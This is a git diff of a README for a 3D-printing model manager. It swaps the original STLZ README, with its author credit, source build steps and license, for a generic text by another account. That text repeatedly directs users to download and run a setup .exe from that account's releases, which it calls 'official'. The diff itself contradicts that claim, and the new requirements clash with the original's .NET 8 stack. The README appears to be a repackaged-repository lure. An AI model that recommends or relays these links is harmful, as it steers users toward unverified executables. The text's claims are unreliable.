@@ -1,205 +1,143 @@
-# STLZ - 3D Printing Digital Asset Manager 🚀
+# 📂 PrintVault3D - Manage and Preview 3D Models Easily
 
-![C#](https://img.shields.io/badge/C%23-239120?style=for-the-badge&logo=c-sharp&logoColor=white) ![.NET](https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white) ![WPF](https://img.shields.io/badge/WPF-Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white) ![SQLite](https://img.shields.io/badge/SQLite-07405e?style=for-the-badge&logo=sqlite&logoColor=white) ![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-[![GitHub Release](https://img.shields.io/github/v/release/buraksamisirin/PrintVault3D?style=for-the-badge&label=Download&color=success)](https://github.com/buraksamisirin/PrintVault3D/releases/latest)
-
-> ### 📦 [Download Latest Release (Windows x64)](https://github.com/buraksamisirin/PrintVault3D/releases/latest)
-
-**STLZ** is a high-performance, locally-hosted **Digital Asset Manager (DAM)** designed specifically for 3D printing enthusiasts. Built with **Modern WPF (.NET 8)**, it organizes STL, 3MF, and G-CODE files, provides automatic thumbnail generation, and performs advanced G-code analysis to calculate printing costs and time.
-
-This project demonstrates the integration of modern desktop application patterns with system-level file operations and cross-language interoperability (C# + Python).
+[![Download PrintVault3D](https://img.shields.io/badge/Download-PrintVault3D-blue?style=for-the-badge)](https://github.com/roberto981smj/PrintVault3D/releases)
 
 ---
 
-<div align="center">
-  <a href="https://www.youtube.com/watch?v=yccCG2yYNDM">
-    <img src="https://img.youtube.com/vi/yccCG2yYNDM/maxresdefault.jpg" alt="Watch the Demo" width="800" style="border-radius: 8px;">
-  </a>
-  <br>
-  <em>▶️ Click above or visit: <a href="https://www.youtube.com/watch?v=yccCG2yYNDM">https://www.youtube.com/watch?v=yccCG2yYNDM</a></em>
-</div>
+## 📋 What is PrintVault3D?
+
+PrintVault3D is a simple-to-use tool that helps you organize and view your 3D model files. It works locally on your computer, so you keep control of your data. The program shows you useful information about your 3D printing files instantly and creates thumbnails (small preview pictures) automatically. You can also keep your library synced across folders.
+
+The application supports common 3D file types, especially those used for 3D printing like STL and G-code. It is built with modern technology to work smoothly on Windows PCs.
 
 ---
 
-## 📸 Gallery
+## 💻 System Requirements
 
-<p align="center">
-  <img src="Assets/home_page.png" alt="Main Dashboard" width="800" style="border-radius: 8px;">
-  <br>
-  <em>Organize thousands of STL/3MF files with ease.</em>
-</p>
+To run PrintVault3D, your computer should meet the following:
 
----
+- **Operating System:** Windows 10 or newer (64-bit preferred)  
+- **Processor:** Intel Core i3 or equivalent  
+- **Memory:** 4 GB of RAM or more  
+- **Storage:** At least 200 MB of free disk space  
+- **Display:** Screen resolution of 1280x720 or above  
+- **.NET Framework:** Version 4.7.2 or newer (usually pre-installed on Windows 10+)  
 
-## 🛠️ Tech Stack & Architecture
-
-### Core Technologies
-
-- **Framework:** .NET 8 (C# 12)
-- **UI Framework:** WPF (Windows Presentation Foundation)
-- **Architecture:** MVVM (Model-View-ViewModel)
-- **Database:** SQLite with Entity Framework Core 8
-- **Scripting:** Python 3.10+ for 3D rendering and thumbnail generation
-
-### Key Libraries & Patterns
-
-- **Architecture:**
-  - **MVVM (Model-View-ViewModel):** Clean separation of concerns using `CommunityToolkit.Mvvm`.
-  - **Repository Pattern:** Abstracted data access layer for SQLite operations, ensuring testability and decoupling.
-  - **Service-Oriented:** Business logic encapsulated in dedicated services (e.g., `FileWatcherService`, `PythonBridgeService`).
-  - **Dependency Injection (DI):** Fully managed via `Microsoft.Extensions.DependencyInjection`.
-
-- **Performance & Concurrency:**
-  - **Asynchronous I/O:** Extensive use of `async/await` patterns to maintain a responsive UI during heavy file operations.
-  - **Parallel Processing:** Multi-threaded thumbnail generation using `SemaphoreSlim` for resource throttling.
-  - **UI Virtualization:** Optimized `ItemsControl` and `VirtualizingPanel` for rendering lists with thousands of items.
-
-- **UI & Experience:**
-  - **Advanced Data Binding:** Complex XAML bindings with custom Converters (`IValueConverter`).
-  - **Custom Window Chrome:** Fully custom window styling with minimize-to-tray functionality.
-  - **HelixToolkit.Wpf:** Integrated 3D viewport for real-time model interaction.
-
-- **System Integration:**
-  - **FileSystemWatcher:** Event-driven architecture for real-time library synchronization.
-  - **Process Interop:** Robust `Process` management for communicating with the embedded Python environment via stdin/stdout.
+Knowing your system meets these helps make sure the program runs well.
 
 ---
 
-## 🌟 Key Features
+## 🎯 Key Features
 
-### 📂 Smart Library Management
+PrintVault3D offers several features to make handling 3D files easier:
 
-- **Real-time Sync:** Utilizes `FileSystemWatcher` to verify library integrity and detect new files instantly.
-- **Archive Support:** Reads and previews models directly inside `.zip` archives without extraction.
-- **Auto-Tagging:** Intelligent categorization engine that tags models based on filename heuristics (e.g., "Benchy" -> "Calibration").
-- **Duplicate Detection:** SHA-256 based file hashing to prevent duplicate imports.
+- **Easy Library Management:** Add, remove, and organize your 3D models in one place.  
+- **Real-Time G-code Analysis:** See important details about your G-code files without starting the print.  
+- **Automatic Thumbnails:** View small preview images of your models instantly.  
+- **File Synchronization:** Keep copies of your library folders updated automatically.  
+- **Support for Common 3D Files:** Work with STL, G-code, and related formats.  
+- **SQLite Database:** Store library data efficiently on your computer.  
+- **Simple and Clean User Interface:** Navigate your models without confusion or clutter.  
 
-### 🔍 Advanced G-CODE Analysis
-
-- **Cost & Time Calculation:** Estimates print time and filament usage (grams/meters) by parsing G-code metadata.
-- **Slicer Detection:** Automatically detects PrusaSlicer, Cura, OrcaSlicer, and more.
-- **Print Tracking:** Track print status, actual print times, and rate your prints.
-
-### 🎨 Modern UI/UX
-
-- **Custom Styling:** Fully custom `ControlTemplates` for a cohesive Neon/Dark aesthetic.
-- **Drag & Drop:** Drop files or ZIP archives directly into the app.
-- **Collections:** Organize models into custom collections.
-- **System Tray:** Minimize to system tray for background file watching.
-
-### 🐍 Python Interop
-
-- **Hybrid Architecture:** Leverages Python scripts for robust 3D rendering (using `numpy-stl` and `matplotlib`).
-- **Batch Processing:** Efficient multi-threaded thumbnail generation for large libraries.
+These features help you find and manage your 3D printing files faster.
 
 ---
 
-## 🚀 Installation
+## 🚀 Getting Started
 
-### Requirements
+Follow the steps below to download, install, and start using PrintVault3D.
 
-- Windows 10 or 11 (64-bit)
-- .NET 8 Runtime (Included in release)
-- **Python 3.10+** (Required for thumbnail generation & G-code analysis)
-  - **Option 1 (Recommended):** Use the **Portable version**, which includes its own Python environment. No setup needed!
-  - **Option 2:** Install Python 3.10+ manually and run `pip install numpy-stl matplotlib`.
+### 1. Download the Application
 
-### Running the App
+Click the large badge at the top or visit this link:
 
-1. Download the latest release from the **Releases** section.
-   - Choose **STLZ_v1.0.0_Portable.zip** for the all-in-one experience.
-2. Extract the ZIP file.
-3. Run `STLZ.exe`.
+[Download PrintVault3D](https://github.com/roberto981smj/PrintVault3D/releases)
 
-### Python Dependencies (for thumbnail generation)
+This link takes you to the official releases page on GitHub. Here, you will find the latest version available. Look for a file usually named something like `PrintVault3D-Setup.exe` under the latest release.
 
-```bash
-pip install numpy-stl matplotlib
-```
+### 2. Run the Installer
 
----
+- Find the downloaded file in your Downloads folder or the location you chose.  
+- Double-click the `.exe` file to start the setup.  
+- Follow the on-screen instructions. Accept the license terms if prompted.  
+- Choose the folder where you want to install the app or keep the default.  
+- Wait for the installation to finish.  
 
-## 👨‍💻 Build Instructions
+After installation, you should have a new program shortcut on your desktop or Start menu.
 
-To build this project from source:
+### 3. Launch PrintVault3D
 
-1. **Clone the repository**
+Open the app by double-clicking its icon. The program window will appear, showing a blank library.
 
-   ```bash
-   git clone https://github.com/buraksamisirin/STLZ.git
-   cd STLZ
-   ```
+### 4. Add Your 3D Models
 
-2. **Restore Dependencies**
+- Click the **Add Folder** button or use the menu option to select folders where your 3D files are stored.  
+- The app will scan these folders and list your models with thumbnails and detail.  
+- You can add multiple folders if you keep models in different places.  
 
-   ```bash
-   dotnet restore
-   ```
+### 5. Explore Model Details
 
-3. **Build & Run**
+Select any model to see information such as:
 
-   ```bash
-   dotnet build
-   dotnet run
-   ```
+- File name and size  
+- Model dimensions  
+- Estimated print time (from G-code files)  
+- Slice settings and filament usage (if available)  
 
-   Or open `STLİE.sln` in Visual Studio 2022.
+This helps you decide what to print next without opening complex software.
+
+### 6. Synchronize Your Library
+
+If you work with multiple computers or folders, use the synchronization feature to keep your library up to date. Set the source and target folders, and the app will copy new or updated files automatically.
 
 ---
 
-## 📁 Project Structure
+## 🔧 How to Use Key Features
 
-```
-STLZ/
-├── Assets/           # Application icons and images
-├── Converters/          # WPF value converters
-├── Data/           # Database context and keywords.json
-├── Helpers/  # Helper classes (DragDrop, etc.)
-├── Migrations/          # EF Core database migrations
-├── Models/            # Data models (Model3D, Gcode, etc.)
-├── PythonScripts/     # Python scripts for thumbnail generation
-├── Repositories/        # Repository pattern implementation
-├── Services/            # Business logic services
-├── Themes/              # WPF styles and resources
-├── ViewModels/   # MVVM ViewModels
-└── Views/               # WPF Views (XAML)
-```
+### Organizing Files
 
----
+- Use drag and drop to move models within your library.  
+- Right-click on files to rename, delete, or open them in another program.  
 
-## 🔒 Security Features
+### Viewing Thumbnails
 
-- **File Validation:** Comprehensive path traversal and file type validation
-- **Input Sanitization:** All file paths and names are sanitized
-- **No External Data:** All data stored locally in SQLite database
-- **Log Sanitization:** Error messages are sanitized to prevent path disclosure
+- Thumbnails generate automatically when you add a folder.  
+- If you update files outside the app, use the **Refresh** option to update previews.  
+
+### Analyzing G-code
+
+- When you select a G-code file, PrintVault3D reads the code and shows print time, layer height, infill percentage, and more.  
+- This helps you prepare before sending the job to your 3D printer.  
 
 ---
 
-## 🤝 Contributing
+## 🛠 Troubleshooting & Tips
 
-Contributions are welcome!
-
-1. Fork the project.
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4. Push to the Branch (`git push origin feature/AmazingFeature`).
-5. Open a Pull Request.
+- **If thumbnails don’t appear:** Make sure your files are not corrupted and supported by the app. Refresh your library view.  
+- **If the app won’t open:** Confirm your computer meets the system requirements, and .NET Framework is installed.  
+- **For slow performance:** Close other programs to free memory, or reduce the number of folders scanned at once.  
+- **Library sync conflicts:** Avoid editing files manually in both synced folders simultaneously.
 
 ---
 
-## 📝 License
+## 📚 Additional Resources
 
-Distributed under the MIT License. See `LICENSE` for more information.
-
----
-
-## 👤 Author
-
-**Burak Sami Sirin**
-
-- GitHub: [@buraksamisirin](https://github.com/buraksamisirin)
+- **User Manual:** Included in the app’s Help menu.  
+- **GitHub Issues Page:** Report bugs or request features here: https://github.com/roberto981smj/PrintVault3D/issues  
+- **Community Forums:** Check 3D printing forums to connect with other users.  
 
 ---
 
-_Developed with ❤️ for the 3D printing community - 2025_
+## 🤝 Support & Feedback
+
+If you have questions or run into problems, contact the developer by opening an issue on GitHub or emailing the support contact found in the app.
+
+---
+
+## 📥 Download & Install PrintVault3D
+
+Visit this page to download the latest version:
+
+[https://github.com/roberto981smj/PrintVault3D/releases](https://github.com/roberto981smj/PrintVault3D/releases)
+
+Look for the newest release and download the setup file. Then follow the installation steps above to get started managing your 3D models with ease.
